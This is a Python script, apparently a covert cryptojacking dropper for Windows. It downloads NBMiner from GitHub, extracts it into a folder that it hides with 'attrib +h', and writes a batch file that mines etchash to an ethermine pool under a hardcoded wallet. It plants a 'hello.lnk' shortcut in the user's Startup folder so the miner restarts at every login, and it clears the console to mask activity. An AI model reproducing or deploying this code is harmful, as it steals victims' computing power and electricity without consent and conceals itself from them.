import requests as r
import os,threading
import zipfile
import time
import  win32com.client
import subprocess,time
lg = os.getlogin()
path = os.getcwd()+'\\'

docloc = f'C:\\Users\\{lg}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hello.lnk'
srt1 = os.path.exists(docloc)
srt2 = os.path.exists(f'{path}extended')
def clss():
    time.sleep(4)
    os.system('cls')
def start():
    threading.Thread(target=clss).start()
    proc = subprocess.call(f'cscript {path}st.vbs',shell=False)
if not srt1 or not srt2:
    def set_sr():
        st = f'C:\\Users\\{lg}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        #desktop = r"path to where you wanna put your .lnk file"
        pat = os.path.join(st, 'hello.lnk')
        
        t = f'{path}st.vbs' 
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(pat)
        shortcut.Targetpath = t
        shortcut.save()

    url = 'https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip'
    req = r.get(url,{})
    path_to_zip_file = path

    time.sleep(0.4)
    with open(path_to_zip_file+r'\x.zip', 'wb') as w:
        w.write(req.content)

    with zipfile.ZipFile(path_to_zip_file+r'\x.zip', 'r') as zip_ref:
        zip_ref.extractall(path_to_zip_file+r'\extracted')
        
    os.remove(path_to_zip_file+r'\x.zip')
    fn = path_to_zip_file + r'\extracted'
    p = os.popen('attrib +h ' + fn)

    t = f'{path}extracted\\NBMiner_Win\\'+ r'run.bat'
    with open(t, 'w') as w:
        w.write('@cd /d "%~dp0"\nnbminer -a etchash -o stratum+tcp://asia1-etc.ethermine.org:14444 -u 0x4296116d44a4a7259B52B1A756e19083e675062A.default -log\npause')

    set_sr()
    with open(f'{path}st.bat', 'w') as startDoc:
        startDoc.write(f'start "" "{docloc}"')

threading.Thread(target=start).start()